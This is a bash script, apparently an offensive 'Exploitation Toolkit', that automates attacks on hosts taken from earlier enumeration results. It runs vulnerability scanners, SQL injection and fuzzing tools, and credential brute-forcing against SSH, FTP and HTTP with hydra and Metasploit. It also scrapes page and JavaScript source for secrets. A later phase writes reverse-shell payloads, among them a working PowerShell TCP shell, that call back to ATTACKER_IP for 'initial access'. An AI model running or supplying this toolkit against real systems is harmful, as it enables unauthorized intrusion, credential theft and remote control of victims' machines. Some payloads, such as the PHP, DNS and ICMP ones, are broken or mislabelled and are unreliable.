#!/bin/bash

# ⚔️ Exploitation Toolkit v1.0 — Initial Access
# Author: invisigoth29 
# Based on: 3-Exploitation/initial-access.md

# OS Detection
OS=$(uname -s)
case "$OS" in
    Darwin)
        OS_TYPE="mac"
        PACKAGE_MANAGER="brew"
        ;;
    Linux)
        OS_TYPE="linux"
        PACKAGE_MANAGER="apt"
        ;;
    *)
        echo "[!] Unsupported OS: $OS. This script supports macOS and Linux only."
        exit 1
        ;;
esac

# Ensure Go bin is in PATH
if [ -d "$HOME/go/bin" ]; then
    export PATH="$HOME/go/bin:$PATH"
fi

timestamp=$(date +"%Y-%m-%d_%H-%M-%S")
workspace="exploitation_$timestamp"
mkdir -p "$workspace"/{web,infrastructure,loot,sessions,reports}

error_log="$workspace/error.log"

# Parse command line arguments
ENUMERATION_DIR=""
SCAN_TYPE="all"
THREADS=50
VERBOSE=false
INTERACTIVE=false

show_usage() {
    echo "Usage: $0 -e <enumeration_dir> [options]"
    echo ""
    echo "Required:"
    echo "  -e <dir>        Directory containing enumeration results"
    echo ""
    echo "Options:"
    echo "  -s <type>       Scan type: all, web, infrastructure"
    echo "  -n <threads>    Number of threads (default: 50)"
    echo "  -v              Verbose output"
    echo "  -i              Interactive mode (pause between phases)"
    echo "  -h              Show this help"
    echo ""
    echo "Examples:"
    echo "  $0 -e enumeration_2024-01-01_12-00-00    # Full exploitation"
    echo "  $0 -e enum_results -s web -v             # Web attacks only"
    echo "  $0 -e enum_results -s infrastructure -i  # Infrastructure with interactive mode"
}

while getopts "e:s:n:vih" opt; do
    case $opt in
        e) ENUMERATION_DIR="$OPTARG" ;;
        s) SCAN_TYPE="$OPTARG" ;;
        n) THREADS="$OPTARG" ;;
        v) VERBOSE=true ;;
        i) INTERACTIVE=true ;;
        h) show_usage; exit 0 ;;
        *) show_usage; exit 1 ;;
    esac
done

if [ -z "$ENUMERATION_DIR" ]; then
    echo "[!] Enumeration directory is required"
    show_usage
    exit 1
fi

if [ ! -d "$ENUMERATION_DIR" ]; then
    echo "[!] Enumeration directory not found: $ENUMERATION_DIR"
    exit 1
fi

# ===== Utility Functions =====
run() {
    echo "[*] $1"
    if [ "$VERBOSE" = true ]; then
        eval "$2"
    else
        eval "$2" >/dev/null 2>&1
    fi
    if [ $? -ne 0 ]; then
        echo "[!] Error during: $1"
        echo "[!] Failed: $2" | tee -a "$error_log"
    else
        echo "[+] Completed: $1"
    fi
}

log_info() {
    echo "[*] $1"
}

log_success() {
    echo "[+] $1"
}

log_error() {
    echo "[!] $1" | tee -a "$error_log"
}

log_warning() {
    echo "[!] $1"
}

pause_if_interactive() {
    if [ "$INTERACTIVE" = true ]; then
        echo ""
        read -p "Press Enter to continue to next phase..."
        echo ""
    fi
}

# ===== Tool Installation =====
install_package() {
    local package="$1"
    local install_name="$2"
    
    if ! command -v "$package" &> /dev/null; then
        echo "[+] Installing $package..."
        
        case "$PACKAGE_MANAGER" in
            "brew")
                brew install "$install_name" 2>/dev/null
                ;;
            "apt")
                sudo apt update && sudo apt install -y "$install_name" 2>/dev/null
                ;;
        esac
        
        if ! command -v "$package" &> /dev/null; then
            log_warning "Failed to install $package via package manager"
            return 1
        else
            log_success "Installed $package"
        fi
    else
        log_success "Found: $package"
    fi
}

install_go_tool() {
    local tool_name="$1"
    local tool_path="$2"
    
    if ! command -v "$tool_name" &> /dev/null; then
        echo "[+] Installing Go tool: $tool_name"
        go install "$tool_path@latest"
        
        if ! command -v "$tool_name" &> /dev/null; then
            if [ -f "$HOME/go/bin/$tool_name" ]; then
                echo "[*] Tool installed to $HOME/go/bin/$tool_name"
                echo "[*] Note: Ensure $HOME/go/bin is in your PATH"
            else
                log_error "Failed to install $tool_name"
                return 1
            fi
        else
            log_success "Installed: $tool_name"
        fi
    else
        log_success "Found: $tool_name"
    fi
}

install_github_tool() {
    local tool_name="$1"
    local repo_url="$2"
    local binary_name="$3"
    
    if ! command -v "$tool_name" &> /dev/null; then
        echo "[+] Installing GitHub tool: $tool_name"
        
        # Create tools directory if it doesn't exist
        mkdir -p "$HOME/.local/bin"
        
        # Download and install
        cd /tmp
        git clone "$repo_url" "$tool_name" 2>/dev/null
        if [ -d "$tool_name" ]; then
            cd "$tool_name"
            
            # Try to build if it's a Go project
            if [ -f "go.mod" ]; then
                go build -o "$binary_name" .
                mv "$binary_name" "$HOME/.local/bin/"
            elif [ -f "setup.py" ]; then
                python3 setup.py install --user
            elif [ -f "requirements.txt" ]; then
                pip3 install -r requirements.txt
            fi
            
            cd ..
            rm -rf "$tool_name"
            
            # Add to PATH if not already there
            if [[ ":$PATH:" != *":$HOME/.local/bin:"* ]]; then
                export PATH="$HOME/.local/bin:$PATH"
                echo 'export PATH="$HOME/.local/bin:$PATH"' >> "$HOME/.bashrc"
                echo 'export PATH="$HOME/.local/bin:$PATH"' >> "$HOME/.zshrc"
            fi
        fi
        
        if command -v "$tool_name" &> /dev/null; then
            log_success "Installed: $tool_name"
        else
            log_error "Failed to install $tool_name"
            return 1
        fi
    else
        log_success "Found: $tool_name"
    fi
}

# ===== Tool Setup =====
setup_tools() {
    log_info "Setting up exploitation tools..."
    
    # Check for Go
    if ! command -v go &> /dev/null; then
        log_error "Go is not installed. Install Go to continue."
        exit 1
    fi
    
    # Go tools
    go_tools=(
        "nuclei:github.com/projectdiscovery/nuclei/v2/cmd/nuclei"
        "httpx:github.com/projectdiscovery/httpx/cmd/httpx"
        "katana:github.com/projectdiscovery/katana/cmd/katana"
        "subfinder:github.com/projectdiscovery/subfinder/v2/cmd/subfinder"
        "dnsx:github.com/projectdiscovery/dnsx/cmd/dnsx"
        "naabu:github.com/projectdiscovery/naabu/v2/cmd/naabu"
        "interactsh-client:github.com/projectdiscovery/interactsh/cmd/interactsh-client"
    )
    
    for tool_info in "${go_tools[@]}"; do
        IFS=':' read -r tool_name tool_path <<< "$tool_info"
        install_go_tool "$tool_name" "$tool_path"
    done
    
    # Package manager tools
    package_tools=(
        "hydra:hydra"
        "nmap:nmap"
        "curl:curl"
        "wget:wget"
        "git:git"
        "python3:python3"
        "pip3:python3-pip"
    )
    
    for tool_info in "${package_tools[@]}"; do
        IFS=':' read -r tool_name package_name <<< "$tool_info"
        install_package "$tool_name" "$package_name"
    done
    
    # Additional useful tools
    additional_tools=(
        "sqlmap:https://github.com/sqlmapproject/sqlmap:sqlmap"
        "nikto:https://github.com/sullo/nikto:nikto"
        "dirb:https://github.com/v0re/dirb:dirb"
        "wfuzz:https://github.com/xmendez/wfuzz:wfuzz"
        "gobuster:https://github.com/OJ/gobuster:gobuster"
        "wpscan:https://github.com/wpscanteam/wpscan:wpscan"
    )
    
    for tool_info in "${additional_tools[@]}"; do
        IFS=':' read -r tool_name repo_url binary_name <<< "$tool_info"
        install_github_tool "$tool_name" "$repo_url" "$binary_name"
    done
    
    # Special handling for some tools
    if ! command -v crackmapexec &> /dev/null; then
        log_info "Installing crackmapexec..."
        pip3 install crackmapexec
    fi
    
    if ! command -v searchsploit &> /dev/null; then
        log_info "Installing exploitdb..."
        case "$PACKAGE_MANAGER" in
            "brew")
                brew install exploitdb
                ;;
            "apt")
                sudo apt install -y exploitdb
                ;;
        esac
    fi
    
    # Install WPScan via package manager first, then GitHub if needed
    if ! command -v wpscan &> /dev/null; then
        log_info "Installing WPScan..."
        case "$PACKAGE_MANAGER" in
            "brew")
                brew install wpscan
                ;;
            "apt")
                sudo apt install -y wpscan
                ;;
        esac
        
        # If package manager installation failed, try GitHub
        if ! command -v wpscan &> /dev/null; then
            log_info "WPScan not found in package manager, installing from GitHub..."
            cd /tmp
            git clone https://github.com/wpscanteam/wpscan.git
            cd wpscan
            if [ -f "Gemfile" ]; then
                # Install Ruby dependencies and build
                sudo gem install bundler
                bundle install
                sudo gem build wpscan.gemspec
                sudo gem install wpscan-*.gem
            fi
            cd ..
            rm -rf wpscan
        fi
    fi
    
    # Install Metasploit Framework
    if ! command -v msfconsole &> /dev/null; then
        log_info "Installing Metasploit Framework..."
        case "$PACKAGE_MANAGER" in
            "brew")
                brew install metasploit
                ;;
            "apt")
                # Add Metasploit repository for Ubuntu/Debian
                curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
                chmod +x msfinstall
                sudo ./msfinstall
                rm msfinstall
                ;;
        esac
        
        # If package manager installation failed, try direct installation
        if ! command -v msfconsole &> /dev/null; then
            log_info "Metasploit not found in package manager, installing directly..."
            case "$OS_TYPE" in
                "linux")
                    # Install dependencies
                    sudo apt update
                    sudo apt install -y build-essential libreadline-dev libssl-dev libpq5 libpq-dev libreadline5 libsqlite3-dev libpcap-dev openjdk-11-jre git-core autoconf postgresql pgadmin3 curl zlib1g-dev libxml2-dev libxslt1-dev libyaml-dev curl zlib1g-dev gawk bison libffi-dev libgdbm-dev libncurses5-dev libtool libsqlite3-dev libmysqlclient-dev libpng-dev libjpeg-dev
                    
                    # Clone and install Metasploit
                    cd /opt
                    sudo git clone https://github.com/rapid7/metasploit-framework.git
                    cd metasploit-framework
                    sudo bundle install
                    sudo ln -sf /opt/metasploit-framework/msfconsole /usr/local/bin/msfconsole
                    sudo ln -sf /opt/metasploit-framework/msfvenom /usr/local/bin/msfvenom
                    sudo ln -sf /opt/metasploit-framework/msfupdate /usr/local/bin/msfupdate
                    ;;
                "mac")
                    # For macOS, try Homebrew again or manual installation
                    if ! brew install metasploit; then
                        log_warning "Metasploit installation via Homebrew failed. Please install manually."
                    fi
                    ;;
            esac
        fi
    fi
    
    # Verify Wfuzz installation (already in additional_tools, but double-check)
    if ! command -v wfuzz &> /dev/null; then
        log_warning "Wfuzz not found. It should have been installed via GitHub. Please check installation."
    fi
}

# ===== Target Processing =====
process_enumeration_results() {
    log_info "Processing enumeration results from: $ENUMERATION_DIR"
    
    # Extract HTTP services
    if [ -f "$ENUMERATION_DIR/ports/http_services.txt" ]; then
        cp "$ENUMERATION_DIR/ports/http_services.txt" "$workspace/web/targets.txt"
        log_success "Found $(wc -l < "$workspace/web/targets.txt") web targets"
    elif [ -f "$ENUMERATION_DIR/httpx/live.txt" ]; then
        cp "$ENUMERATION_DIR/httpx/live.txt" "$workspace/web/targets.txt"
        log_success "Found $(wc -l < "$workspace/web/targets.txt") web targets"
    else
        log_warning "No web targets found in enumeration results"
        touch "$workspace/web/targets.txt"
    fi
    
    # Extract infrastructure targets
    if [ -f "$ENUMERATION_DIR/ports/open_ports.txt" ]; then
        cp "$ENUMERATION_DIR/ports/open_ports.txt" "$workspace/infrastructure/ports.txt"
    fi
    
    if [ -f "$ENUMERATION_DIR/subdomains/hosts.txt" ]; then
        cp "$ENUMERATION_DIR/subdomains/hosts.txt" "$workspace/infrastructure/hosts.txt"
    elif [ -f "$ENUMERATION_DIR/subdomains/targets.txt" ]; then
        cp "$ENUMERATION_DIR/subdomains/targets.txt" "$workspace/infrastructure/hosts.txt"
    fi
    
    # Create combined target list
    cat "$workspace/web/targets.txt" "$workspace/infrastructure/hosts.txt" 2>/dev/null | sort -u > "$workspace/all_targets.txt"
    log_success "Total targets: $(wc -l < "$workspace/all_targets.txt")"
}

# ===== Web Application Attacks =====
web_attacks() {
    log_info "Phase 1: Web Application Attacks"
    
    if [ ! -s "$workspace/web/targets.txt" ]; then
        log_warning "No web targets available for web attacks"
        return 1
    fi
    
    # 1. Nuclei vulnerability scanning
    log_info "Running Nuclei vulnerability scans..."
    if command -v nuclei &> /dev/null; then
        run "Running Nuclei with all templates" "nuclei -l '$workspace/web/targets.txt' -t all -severity critical,high,medium -rate-limit $THREADS -o '$workspace/web/nuclei_results.txt'"
        run "Running Nuclei with specific web templates" "nuclei -l '$workspace/web/targets.txt' -t http,web -severity critical,high,medium -rate-limit $THREADS -o '$workspace/web/nuclei_web_results.txt'"
    fi
    
    # 2. Crawling with Katana
    log_info "Crawling web applications with Katana..."
    if command -v katana &> /dev/null; then
        while read -r url; do
            domain=$(echo "$url" | sed 's|^https\?://||' | sed 's|/.*||')
            run "Crawling $domain" "katana -u '$url' -jc -silent -o '$workspace/web/crawl_$domain.txt'"
        done < "$workspace/web/targets.txt"
    fi
    
    # 3. SQL Injection testing
    log_info "Testing for SQL Injection vulnerabilities..."
    if command -v sqlmap &> /dev/null; then
        while read -r url; do
            domain=$(echo "$url" | sed 's|^https\?://||' | sed 's|/.*||')
            run "SQLMap scan on $domain" "sqlmap -u '$url' --batch --random-agent --level 1 --risk 1 --output-dir '$workspace/web/sqlmap_$domain'"
        done < "$workspace/web/targets.txt"
    fi
    
    # 4. XSS testing
    log_info "Testing for XSS vulnerabilities..."
    if command -v nuclei &> /dev/null; then
        run "XSS testing with Nuclei" "nuclei -l '$workspace/web/targets.txt' -t xss -severity critical,high,medium -rate-limit $THREADS -o '$workspace/web/xss_results.txt'"
    fi
    
    # 5. LFI/RFI testing
    log_info "Testing for LFI/RFI vulnerabilities..."
    if command -v nuclei &> /dev/null; then
        run "LFI/RFI testing with Nuclei" "nuclei -l '$workspace/web/targets.txt' -t lfi,rfi -severity critical,high,medium -rate-limit $THREADS -o '$workspace/web/lfi_rfi_results.txt'"
    fi
    
    # 6. File upload testing
    log_info "Testing for file upload vulnerabilities..."
    if command -v nuclei &> /dev/null; then
        run "File upload testing with Nuclei" "nuclei -l '$workspace/web/targets.txt' -t file-upload -severity critical,high,medium -rate-limit $THREADS -o '$workspace/web/file_upload_results.txt'"
    fi
    
    # 7. Authentication bypass testing
    log_info "Testing for authentication bypass..."
    if command -v nuclei &> /dev/null; then
        run "Auth bypass testing with Nuclei" "nuclei -l '$workspace/web/targets.txt' -t auth-bypass -severity critical,high,medium -rate-limit $THREADS -o '$workspace/web/auth_bypass_results.txt'"
    fi
    
    # 8. Unauthenticated endpoints testing
    log_info "Testing for unauthenticated endpoints..."
    if command -v nuclei &> /dev/null; then
        run "Unauthenticated endpoints testing" "nuclei -l '$workspace/web/targets.txt' -t unauth -severity critical,high,medium -rate-limit $THREADS -o '$workspace/web/unauth_endpoints.txt'"
    fi
    
    # 9. JavaScript file analysis for secrets
    log_info "Analyzing JavaScript files for secrets..."
    if command -v katana &> /dev/null; then
        while read -r url; do
            domain=$(echo "$url" | sed 's|^https\?://||' | sed 's|/.*||')
            # Extract JS files and analyze
            katana -u "$url" -jc -silent | grep -E "\.js$" | while read -r js_url; do
                run "Analyzing JS file: $js_url" "curl -s '$js_url' | grep -E '(api_key|password|secret|token|credential)' | tee -a '$workspace/web/js_secrets_$domain.txt'"
            done
        done < "$workspace/web/targets.txt"
    fi
    
    # 10. Source code analysis for API keys and credentials
    log_info "Analyzing source code for API keys and credentials..."
    while read -r url; do
        domain=$(echo "$url" | sed 's|^https\?://||' | sed 's|/.*||')
        run "Analyzing source for $domain" "curl -s '$url' | grep -E '(api_key|password|secret|token|credential|email|username)' | tee -a '$workspace/web/source_secrets_$domain.txt'"
    done < "$workspace/web/targets.txt"
    
    # 11. WordPress scanning with WPScan
    log_info "Scanning for WordPress vulnerabilities..."
    if command -v wpscan &> /dev/null; then
        while read -r url; do
            domain=$(echo "$url" | sed 's|^https\?://||' | sed 's|/.*||')
            run "WPScan on $domain" "wpscan --url '$url' --enumerate p,t,u --random-user-agent --output '$workspace/web/wpscan_$domain.txt'"
        done < "$workspace/web/targets.txt"
    else
        log_warning "WPScan not found, skipping WordPress scans"
    fi
    
    # 12. Web application fuzzing with Wfuzz
    log_info "Fuzzing web applications with Wfuzz..."
    if command -v wfuzz &> /dev/null; then
        while read -r url; do
            domain=$(echo "$url" | sed 's|^https\?://||' | sed 's|/.*||')
            # Fuzz common directories
            run "Wfuzz directory fuzzing on $domain" "wfuzz -u '$url/FUZZ' -w /usr/share/wordlists/dirb/common.txt --hc 404 -o '$workspace/web/wfuzz_dirs_$domain.txt'"
            # Fuzz common files
            run "Wfuzz file fuzzing on $domain" "wfuzz -u '$url/FUZZ' -w /usr/share/wordlists/dirb/common.txt --hc 404 -o '$workspace/web/wfuzz_files_$domain.txt'"
        done < "$workspace/web/targets.txt"
    else
        log_warning "Wfuzz not found, skipping web fuzzing"
    fi
    
    pause_if_interactive
}

# ===== Infrastructure Attacks =====
infrastructure_attacks() {
    log_info "Phase 2: Infrastructure Attacks"
    
    if [ ! -s "$workspace/infrastructure/hosts.txt" ]; then
        log_warning "No infrastructure targets available"
        return 1
    fi
    
    # 1. Default credentials testing
    log_info "Testing default credentials..."
    if command -v hydra &> /dev/null; then
        # SSH default creds
        run "Testing SSH default credentials" "hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt -t $THREADS -o '$workspace/infrastructure/ssh_default_creds.txt' ssh"
        
        # FTP default creds
        run "Testing FTP default credentials" "hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt -t $THREADS -o '$workspace/infrastructure/ftp_default_creds.txt' ftp"
        
        # HTTP basic auth
        run "Testing HTTP basic auth" "hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt -t $THREADS -o '$workspace/infrastructure/http_auth_creds.txt' http-get"
    fi
    
    # 2. CrackMapExec for Windows/Active Directory
    if command -v crackmapexec &> /dev/null; then
        log_info "Running CrackMapExec for Windows/AD enumeration..."
        run "CrackMapExec SMB enumeration" "crackmapexec smb -l '$workspace/infrastructure/hosts.txt' --shares --users --pass-pol -o '$workspace/infrastructure/cme_smb_results.txt'"
        run "CrackMapExec WinRM enumeration" "crackmapexec winrm -l '$workspace/infrastructure/hosts.txt' --users --pass-pol -o '$workspace/infrastructure/cme_winrm_results.txt'"
    fi
    
    # 3. Service-specific misconfigurations
    log_info "Checking for service misconfigurations..."
    
    # Redis
    while read -r host; do
        run "Testing Redis on $host" "echo 'INFO' | nc '$host' 6379 2>/dev/null | tee -a '$workspace/infrastructure/redis_$host.txt'"
    done < "$workspace/infrastructure/hosts.txt"
    
    # MongoDB
    while read -r host; do
        run "Testing MongoDB on $host" "echo 'db.adminCommand('listDatabases')' | nc '$host' 27017 2>/dev/null | tee -a '$workspace/infrastructure/mongodb_$host.txt'"
    done < "$workspace/infrastructure/hosts.txt"
    
    # Elasticsearch
    while read -r host; do
        run "Testing Elasticsearch on $host" "curl -s 'http://$host:9200/_cluster/health' 2>/dev/null | tee -a '$workspace/infrastructure/elasticsearch_$host.txt'"
    done < "$workspace/infrastructure/hosts.txt"
    
    # Jenkins
    while read -r host; do
        run "Testing Jenkins on $host" "curl -s 'http://$host:8080' 2>/dev/null | tee -a '$workspace/infrastructure/jenkins_$host.txt'"
    done < "$workspace/infrastructure/hosts.txt"
    
    # 4. Vulnerability scanning with Nuclei
    log_info "Running infrastructure vulnerability scans..."
    if command -v nuclei &> /dev/null; then
        run "Infrastructure vulnerability scan" "nuclei -l '$workspace/infrastructure/hosts.txt' -t network -severity critical,high,medium -rate-limit $THREADS -o '$workspace/infrastructure/nuclei_network_results.txt'"
    fi
    
    # 5. Searchsploit for known exploits
    log_info "Searching for known exploits..."
    if command -v searchsploit &> /dev/null; then
        # Extract service versions from nmap results
        if [ -f "$ENUMERATION_DIR/ports/version_scan.txt" ]; then
            grep -E "open.*[0-9]" "$ENUMERATION_DIR/ports/version_scan.txt" | while read -r line; do
                service=$(echo "$line" | awk '{print $3}')
                version=$(echo "$line" | awk '{print $4}')
                if [ -n "$service" ] && [ -n "$version" ]; then
                    run "Searching exploits for $service $version" "searchsploit '$service' '$version' | tee -a '$workspace/infrastructure/searchsploit_results.txt'"
                fi
            done
        fi
    fi
    
    # 6. Metasploit Framework integration
    log_info "Preparing Metasploit Framework for exploitation..."
    if command -v msfconsole &> /dev/null; then
        # Create Metasploit resource script for common exploits
        cat > "$workspace/infrastructure/metasploit_scan.rc" << 'EOF'
# Metasploit resource script for automated scanning
use auxiliary/scanner/ssh/ssh_version
use auxiliary/scanner/ftp/ftp_version
use auxiliary/scanner/http/http_version
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/rdp/rdp_scanner
use auxiliary/scanner/ldap/ldap_rootdse

# Set global options
setg RHOSTS file:/tmp/targets.txt
setg THREADS 10
setg VERBOSE true

# Run scans
run

# Search for exploits based on discovered services
use auxiliary/scanner/ssh/ssh_login
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
run

# Exit
exit
EOF
        
        # Copy targets to temporary file for Metasploit
        cp "$workspace/infrastructure/hosts.txt" /tmp/targets.txt
        
        run "Running Metasploit automated scan" "msfconsole -r '$workspace/infrastructure/metasploit_scan.rc' -o '$workspace/infrastructure/metasploit_results.txt'"
        
        # Clean up
        rm -f /tmp/targets.txt
        
        log_success "Metasploit scan completed. Check $workspace/infrastructure/metasploit_results.txt"
    else
        log_warning "Metasploit Framework not found, skipping automated exploitation"
    fi
    
    pause_if_interactive
}

# ===== Initial Foothold =====
initial_foothold() {
    log_info "Phase 3: Initial Foothold Preparation"
    
    # Create reverse shell payloads
    log_info "Generating reverse shell payloads..."
    
    # HTTP reverse shell (PHP)
    cat > "$workspace/loot/rev_shell_http.php" << 'EOF'
<?php
$sock=fsockopen("ATTACKER_IP",4444);
exec("/bin/sh -i <&3 >&3 2>&3");
?>
EOF
    
    # SMB reverse shell
    cat > "$workspace/loot/rev_shell_smb.bat" << 'EOF'
@echo off
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
EOF
    
    # DNS reverse shell (PowerShell)
    cat > "$workspace/loot/rev_shell_dns.ps1" << 'EOF'
$dns = "ATTACKER_IP"
$cmd = "whoami"
$encoded = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($cmd))
$query = "$encoded.$dns"
Resolve-DnsName -Name $query -Type A
EOF
    
    # ICMP reverse shell (bash)
    cat > "$workspace/loot/rev_shell_icmp.sh" << 'EOF'
#!/bin/bash
while true; do
    ping -c 1 ATTACKER_IP | grep -q "64 bytes" && echo "ICMP received" || echo "No ICMP"
    sleep 5
done
EOF
    
    log_success "Reverse shell payloads created in $workspace/loot/"
    log_info "Remember to replace ATTACKER_IP with your actual IP address"
    
    # Create session logging directory
    mkdir -p "$workspace/sessions"
    log_info "Session logs will be saved to $workspace/sessions/"
    
    pause_if_interactive
}

# ===== Report Generation =====
generate_report() {
    log_info "Generating exploitation report"
    
    report_file="$workspace/reports/exploitation_report.txt"
    
    {
        echo "=== Exploitation Report ==="
        echo "Generated: $(date)"
        echo "Enumeration Source: $ENUMERATION_DIR"
        echo "Scan Type: $SCAN_TYPE"
        echo ""
        
        echo "=== Web Application Vulnerabilities ==="
        if [ -s "$workspace/web/nuclei_results.txt" ]; then
            echo "Critical/High vulnerabilities found:"
            grep -E "(critical|high)" "$workspace/web/nuclei_results.txt" | head -10
        else
            echo "No critical/high web vulnerabilities found"
        fi
        
        # WordPress vulnerabilities
        find "$workspace/web" -name "wpscan_*.txt" | while read -r file; do
            if [ -s "$file" ]; then
                echo "WordPress vulnerabilities found in: $file"
            fi
        done
        
        # Wfuzz results
        find "$workspace/web" -name "wfuzz_*.txt" | while read -r file; do
            if [ -s "$file" ]; then
                echo "Web fuzzing results in: $file"
            fi
        done
        echo ""
        
        echo "=== Infrastructure Vulnerabilities ==="
        if [ -s "$workspace/infrastructure/nuclei_network_results.txt" ]; then
            echo "Network vulnerabilities found:"
            grep -E "(critical|high)" "$workspace/infrastructure/nuclei_network_results.txt" | head -10
        else
            echo "No critical/high infrastructure vulnerabilities found"
        fi
        echo ""
        
        echo "=== Default Credentials ==="
        if [ -s "$workspace/infrastructure/ssh_default_creds.txt" ]; then
            echo "SSH default credentials found:"
            cat "$workspace/infrastructure/ssh_default_creds.txt"
        fi
        if [ -s "$workspace/infrastructure/ftp_default_creds.txt" ]; then
            echo "FTP default credentials found:"
            cat "$workspace/infrastructure/ftp_default_creds.txt"
        fi
        echo ""
        
        echo "=== Service Misconfigurations ==="
        find "$workspace/infrastructure" -name "*redis*" -o -name "*mongodb*" -o -name "*elasticsearch*" -o -name "*jenkins*" | while read -r file; do
            if [ -s "$file" ]; then
                echo "Misconfiguration found: $file"
            fi
        done
        
        # Metasploit results
        if [ -s "$workspace/infrastructure/metasploit_results.txt" ]; then
            echo "Metasploit Framework results: $workspace/infrastructure/metasploit_results.txt"
        fi
        echo ""
        
        echo "=== Secrets Found ==="
        find "$workspace/web" -name "*secrets*" | while read -r file; do
            if [ -s "$file" ]; then
                echo "Secrets found in: $file"
            fi
        done
        echo ""
        
        echo "=== Next Steps ==="
        echo "1. Review all vulnerability findings"
        echo "2. Prioritize critical and high severity issues"
        echo "3. Attempt exploitation of identified vulnerabilities"
        echo "4. Use reverse shell payloads for initial access"
        echo "5. Document successful exploitation in sessions/"
        echo ""
        
        echo "=== Files Generated ==="
        find "$workspace" -type f -name "*.txt" -o -name "*.json" -o -name "*.php" -o -name "*.bat" -o -name "*.ps1" -o -name "*.sh" | sort
        
    } > "$report_file"
    
    log_success "Report generated: $report_file"
}

# ===== Main Workflow =====
main() {
    log_info "Starting Exploitation Toolkit..."
    
    setup_tools
    process_enumeration_results
    
    case "$SCAN_TYPE" in
        "all")
            web_attacks
            infrastructure_attacks
            initial_foothold
            ;;
        "web")
            web_attacks
            ;;
        "infrastructure")
            infrastructure_attacks
            initial_foothold
            ;;
        *)
            log_error "Invalid scan type: $SCAN_TYPE"
            exit 1
            ;;
    esac
    
    generate_report
    
    # Summary
    log_success "Exploitation complete! ⚔️ Output saved in: $workspace"
    log_success "Summary:"
    echo "    - Web targets: $( [ -f "$workspace/web/targets.txt" ] && wc -l < "$workspace/web/targets.txt" || echo 0 )"
    echo "    - Infrastructure targets: $( [ -f "$workspace/infrastructure/hosts.txt" ] && wc -l < "$workspace/infrastructure/hosts.txt" || echo 0 )"
    echo "    - Critical/High vulnerabilities: $( [ -f "$workspace/web/nuclei_results.txt" ] && grep -c "critical\|high" "$workspace/web/nuclei_results.txt" || echo 0 )"
    echo "    - WordPress scans: $(find "$workspace/web" -name "wpscan_*.txt" 2>/dev/null | wc -l)"
    echo "    - Web fuzzing results: $(find "$workspace/web" -name "wfuzz_*.txt" 2>/dev/null | wc -l)"
    echo "    - Metasploit results: $( [ -f "$workspace/infrastructure/metasploit_results.txt" ] && echo "Available" || echo "None" )"
    echo "    - Report: $workspace/reports/exploitation_report.txt"
    echo "    - Reverse shells: $workspace/loot/"
    
    [ -s "$error_log" ] && log_error "Errors logged to: $error_log" || rm -f "$error_log"
}

# Run main function
main
